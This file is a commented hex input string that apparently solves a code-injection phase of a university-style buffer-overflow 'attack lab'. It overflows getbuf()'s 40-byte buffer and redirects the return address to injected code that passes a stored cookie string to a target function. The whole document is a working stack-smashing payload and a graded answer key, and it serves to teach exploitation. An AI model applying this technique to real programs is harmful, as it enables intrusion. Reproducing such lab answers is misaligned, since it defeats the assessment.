/* Fill getbuf()'s buffer */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
/* Injected code starts here (offset 40, 0x556490e0) */
48 c7 c7 77 91 64 55 68
77 8a 80 00 c3 00 00 00
/* Overwrite the return address with the injected code's address */
e0 90 64 55 00 00 00 00
/* Padding: offsets 64-190 (127 bytes of zeros so the string lands at offset 191) */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00
/* Stored cookie string "4df13892\0" at offset 191 (0x55649177) */
34 64 66 31 33 38 39 32
00